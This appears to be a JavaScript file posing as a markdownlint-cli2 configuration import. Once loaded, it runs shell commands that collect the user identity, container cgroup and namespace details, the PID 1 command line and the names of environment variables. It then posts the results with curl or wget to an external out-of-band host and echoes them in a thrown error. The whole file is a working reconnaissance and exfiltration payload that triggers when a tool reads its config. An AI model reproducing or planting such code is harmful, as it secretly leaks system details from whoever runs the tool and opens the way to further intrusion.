// H67-2: markdownlint-cli2 config import -> fingerprint in the thrown error.
const cp = require('child_process');
const BASE = 'https://dc19bgkqecshk33bhelgbs93m6q9okg13.oast.fun';
let fp = 'none';
try {
  fp = String(cp.execSync('(id; cat /proc/self/cgroup | head -3; echo PID1; head -c 200 /proc/1/cmdline | tr "\\0" " "; echo; echo NS; readlink /proc/self/ns/pid; echo; echo ENV; env | cut -d= -f1 | sort | tr "\\n" " "; echo) 2>&1', {timeout: 8000}));
} catch (e) { fp = 'exec-err:' + e.message; }
try {
  require('fs').writeFileSync('/tmp/h67-md2.txt', fp);
  cp.execSync('curl -s -m 10 --data-binary @/tmp/h67-md2.txt ' + BASE + '/h67-md2 >/dev/null 2>&1 || wget -q -O /dev/null --post-file=/tmp/h67-md2.txt ' + BASE + '/h67-md2 >/dev/null 2>&1', {timeout: 15000});
} catch (e) {}
throw new Error('H67-MD2 ' + String(fp).replace(/\s+/g, ' ').slice(0, 420));
